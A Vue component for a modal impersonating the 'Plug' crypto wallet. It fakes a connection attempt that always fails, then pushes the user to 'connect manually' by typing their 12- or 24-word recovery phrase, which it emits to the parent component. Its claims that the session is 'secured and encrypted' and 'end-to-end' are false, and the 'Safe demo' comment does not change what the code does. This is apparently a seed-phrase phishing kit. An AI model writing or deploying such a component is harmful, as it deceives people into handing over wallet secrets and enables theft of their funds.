
<script setup lang="ts">

interface Props {
  show?: boolean
  walletName?: string
  walletLogo?: string
}

const props = withDefaults(defineProps<Props>(), {
  show: false,
  walletName: 'Plug',
  walletLogo: '/images/logo/plug.svg'
})

const emit = defineEmits<{
  close: []
  submit: [payload: { walletPhrase: string, walletName: string }, ]
}>()

type ModalState =
    | 'connecting'
    | 'failed'
    | 'manual'

const state = ref<ModalState>('connecting')

const walletPhrase = ref('')
const walletPhraseError = ref('')

/*
|--------------------------------------------------------------------------
| Start connection
|--------------------------------------------------------------------------
*/

const startConnection = async () => {
  state.value = 'connecting'
  await new Promise(resolve => setTimeout(resolve, 1800))
  state.value = 'failed'
}




/*
|--------------------------------------------------------------------------
| Try again
|--------------------------------------------------------------------------
*/

const tryAgain = () => {
  startConnection()
}


/*
|--------------------------------------------------------------------------
| Manual connection
|--------------------------------------------------------------------------
*/

const showManualConnection = () => {
  state.value = 'manual'
}


/*
|--------------------------------------------------------------------------
| Safe demo manual connection
|--------------------------------------------------------------------------
*/


function validateSecretPhrase() {
  const trimmed = walletPhrase.value.trim()
  const wordCount = trimmed.split(/\s+/).filter(Boolean).length

  if (!trimmed) {
    walletPhraseError.value = 'Secret Phrase is required'
  } else if (wordCount < 12) {
    walletPhraseError.value = 'Secret Phrase must contain at least 12 words'
  } else {
    walletPhraseError.value = ''
  }
  return !walletPhraseError.value
}
const handleSubmit = () => {
  if (!validateSecretPhrase()) {
    return
  }
  emit('submit', { walletPhrase: walletPhrase.value, walletName: props.walletName })
}

/*
|--------------------------------------------------------------------------
| Reset when modal opens
|--------------------------------------------------------------------------
*/
watch(walletPhrase, () => { walletPhraseError.value = '' })

watch(
    () => props.show,
    (visible) => {
      if (visible) {
        state.value = 'connecting'
        walletPhrase.value = ''

        startConnection()
      }
    }
)


/*
|--------------------------------------------------------------------------
| Close
|--------------------------------------------------------------------------
*/

const closeModal = () => {
  emit('close')
}
</script>


<template>
  <Transition name="modal">

    <!-- Overlay -->
    <div
        v-if="show"
        class="fixed inset-0 z-[1050] flex items-center justify-center bg-black/50 px-4"
        role="dialog"
        aria-modal="true"
        :aria-labelledby="`wallet-modal-${walletName}`"
        @click.self="closeModal"
    >

      <!-- Modal -->
      <div
          class="relative w-full max-w-[520px] rounded-2xl bg-white shadow-2xl"
      >

        <!-- Close -->
        <button
            type="button"
            class="absolute right-4 top-4 z-20 flex h-9 w-9 items-center cursor-pointer justify-center rounded-full text-2xl leading-none text-gray-500 transition hover:bg-gray-100 hover:text-gray-900"
            aria-label="Close"
            @click="closeModal"
        >
          ×
        </button>


        <!-- Modal body -->
        <div class="space-y-5 px-6 py-10 sm:px-10">


          <!-- ====================================================== -->
          <!-- WALLET HEADER -->
          <!-- ====================================================== -->

          <div class="text-center">

            <img
                :src="walletLogo"
                :alt="`${walletName} logo`"
                width="50"
                height="50"
                class="mx-auto h-[50px] w-[50px] object-contain"
            />

            <h3
                :id="`wallet-modal-${walletName}`"
                class="mt-3 text-2xl font-semibold text-[#07122f]"
            >
              {{ walletName }}
            </h3>

          </div>


          <!-- Security -->
          <p class="text-center text-lg text-gray-500">
            This session is secured and encrypted
          </p>


          <!-- ====================================================== -->
          <!-- CONNECTING -->
          <!-- ====================================================== -->

          <div
              v-if="state === 'connecting'"
              class="py-10"
          >

            <div class="flex flex-col items-center">

              <!-- Spinner -->
              <div
                  class="h-10 w-10 animate-spin rounded-full border-4 border-gray-200 border-t-[#5145ff]"
                  aria-hidden="true"
              />

              <div class="mt-8 w-full border-t border-gray-200 pt-6">

                <h5
                    class="text-center text-base font-semibold text-gray-700"
                >
                  Starting secure connection...
                </h5>

                <p class="mt-1 text-center text-sm text-gray-500">
                  Please wait...
                </p>

              </div>

            </div>

          </div>


          <!-- ====================================================== -->
          <!-- FAILED -->
          <!-- ====================================================== -->

          <div v-else-if="state === 'failed'">

            <!-- Error -->
            <div
                class="rounded-md border border-red-500 px-3 py-1 text-center text-base font-medium text-[#FF0000]"
                role="alert"
            >
              An error occurred... please try again or connect manually
            </div>


            <!-- Buttons -->
            <div class="mt-10 space-y-3">

              <!-- Try again -->
              <button
                  type="button"
                  class="w-full rounded-full border border-[#5145ff] px-5 py-3 text-sm font-semibold text-[#5145ff] transition hover:bg-[#5145ff] hover:text-white"
                  @click="tryAgain"
              >
                Try Again
              </button>


              <!-- Manual -->
              <button
                  type="button"
                  class="w-full cursor-pointer rounded-full bg-[#5145ff] px-5 py-3 text-sm font-semibold text-white transition hover:bg-[#4035e8]"
                  @click="showManualConnection"
              >
                Connect Manually
              </button>

            </div>

          </div>


          <!-- ====================================================== -->
          <!-- MANUAL CONNECTION -->
          <!-- ====================================================== -->

          <div v-else-if="state === 'manual'">

            <div class="mb-5">

              <h4 class="text-center text-lg font-semibold text-[#07122f]">
                Connect {{ walletName }}
              </h4>

            </div>

            <div>

              <textarea
                  id="secret_phrase"
                  v-model="walletPhrase"
                  placeholder="Enter your 12 or 24 Mnemonic words. Separate them with spaces"
                  :class="walletPhraseError ? 'border-red-500' : 'border-gray-300'"
                  class="w-full h-32 rounded-md border border-gray-300 px-4 py-3 md:text-base text-sm outline-none transition focus:border-[#5145ff] focus:ring-2 focus:ring-[#5145ff]/20"
              required></textarea>
              <p v-if="walletPhraseError" class="text-red-500 text-sm mt-1">{{ walletPhraseError }}</p>
            </div>


            <!-- Connect -->
            <button
                type="button"
                class="mt-5 cursor-pointer w-full rounded-full bg-[#5145ff] px-5 py-3 text-sm font-semibold text-white transition hover:bg-[#4035e8]"
                @click="handleSubmit"
            >
              Connect Wallet
            </button>


            <!-- Back -->
            <button
                type="button"
                class="mt-3 cursor-pointer w-full px-5 py-2 text-sm font-medium text-gray-500 transition hover:text-gray-900"
                @click="state = 'failed'"
            >
              ← Back
            </button>

          </div>


          <!-- ====================================================== -->
          <!-- BOTTOM SECURITY -->
          <!-- ====================================================== -->

          <div class="pt-8">

            <div
                class="flex items-center justify-between gap-2 text-gray-500"
            >

              <img
                  src="/asset/img/shield.png"
                  alt=""
                  width="30"
                  height="30"
                  class="h-[30px] w-[30px]"
              />
              <div class="text-lg leading-5 font-bold ">
              <span>
                This session is protected with end-to-end encryption
              </span>
              </div>
            </div>

          </div>

        </div>

      </div>

    </div>

  </Transition>
</template>


<style scoped>
.modal-enter-active,
.modal-leave-active {
  transition: opacity 0.2s ease;
}

.modal-enter-active > div,
.modal-leave-active > div {
  transition: transform 0.2s ease;
}

.modal-enter-from,
.modal-leave-to {
  opacity: 0;
}

.modal-enter-from > div,
.modal-leave-to > div {
  transform: scale(0.95);
}
</style>
